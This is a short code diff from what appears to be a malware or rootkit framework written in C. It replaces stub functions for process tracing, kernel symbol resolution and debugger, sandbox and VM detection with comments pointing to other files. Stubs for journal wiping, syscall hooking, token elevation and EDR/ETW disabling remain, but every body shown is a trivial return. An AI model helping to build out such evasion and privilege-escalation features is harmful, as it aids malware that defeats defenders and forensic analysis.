@@ -22,10 +22,8 @@ int jocky_cleanup_usn_journal(void) {
     return 0;
 }
 
-/* Process manipulation stubs */
-int jocky_process_ptrace_attach(int pid) { return (pid > 0) ? 0 : -1; }
-int jocky_process_ptrace_detach(int pid) { return (pid > 0) ? 0 : -1; }
-int jocky_process_get_maps(int pid) { return (pid > 0) ? 0 : -1; }
+/* Process manipulation - implemented in ptrace_control.c */
+/* jocky_process_ptrace_attach, jocky_process_ptrace_detach, jocky_process_get_maps */
 
 /* Syscall operations */
 int jocky_syscall_hook(int number) { return 0; }
@@ -58,20 +56,16 @@ int jocky_elevate_token(void) {
     return -1;
 }
 
-/* Module/symbol operations stubs */
-int jocky_module_resolve_symbol(const char* mod, const char* sym) {
-    return -1;  /* Resolved via kallsyms in module_ops.c */
-}
+/* Module/symbol operations - implemented in module_ops.c */
+/* jocky_module_resolve_symbol */
 
 /* EDR/ETW disabling (no-ops on Linux) */
 int jocky_disable_edr_callbacks(void) { return 0; }
 int jocky_disable_etw(void) { return 0; }
 int edrhoker_detect(void) { return 0; }
 
-/* Anti-analysis stubs */
-int jocky_is_debugger_present(void) { return 0; }  /* Implemented in detection.c */
-int jocky_is_sandbox(void) { return 0; }           /* Implemented in detection.c */
-int jocky_is_vm(void) { return 0; }                /* Implemented in detection.c */
+/* Anti-analysis - implemented in detection.c */
+/* jocky_is_debugger_present, jocky_is_sandbox, jocky_is_vm */
 
 /* Windows registry stubs (no-ops) */
 int jocky_registry_create_key(int h, const char* p, void* o) { return 0; }
